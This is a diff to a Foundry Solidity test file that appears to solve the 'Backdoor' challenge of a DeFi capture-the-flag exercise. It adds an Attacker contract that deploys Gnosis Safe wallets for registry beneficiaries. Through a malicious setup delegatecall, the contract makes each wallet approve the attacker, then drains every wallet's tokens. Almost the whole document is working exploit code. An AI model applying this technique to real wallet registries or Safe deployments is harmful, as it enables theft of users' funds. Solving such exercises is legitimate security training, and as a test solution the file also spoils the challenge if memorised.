@@ -73,6 +73,13 @@ contract Backdoor is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        Attacker attackerContract = new Attacker(users, walletRegistry, walletFactory, masterCopy, dvt);
+
+        attackerContract.attack();
+
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
@@ -100,5 +107,62 @@ contract Backdoor is Test {
 
         // Attacker must have taken all tokens
         assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Attacker {
+    address[] public users;
+    WalletRegistry public walletRegistry;
+    GnosisSafeProxyFactory public walletFactory;
+    GnosisSafe public masterCopy;
+    DamnValuableToken public dvt;
+
+    address public owner;
+
+    constructor(
+        address[] memory _users,
+        WalletRegistry _walletRegistry,
+        GnosisSafeProxyFactory _walletFactory,
+        GnosisSafe _masterCopy,
+        DamnValuableToken _dvt
+    ) {
+        users = _users;
+        walletRegistry = _walletRegistry;
+        walletFactory = _walletFactory;
+        masterCopy = _masterCopy;
+        dvt = _dvt;
+        owner = msg.sender;
+    }
+
+    function attack() public {
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            address wallet = address(
+                walletFactory.createProxyWithCallback(
+                    address(masterCopy),
+                    abi.encodeWithSelector(
+                        GnosisSafe.setup.selector,
+                        owners,
+                        1,
+                        address(this),
+                        abi.encodeWithSelector(this.approve.selector, address(dvt), address(this), type(uint256).max),
+                        address(0),
+                        address(0),
+                        0,
+                        address(0)
+                    ),
+                    i,
+                    walletRegistry
+                )
+            );
+
+            dvt.transferFrom(wallet, owner, dvt.balanceOf(wallet));
+        }
+    }
+
+    function approve(address token, address spender, uint256 amount) public {
+        DamnValuableToken(token).approve(spender, amount);
     }
 }
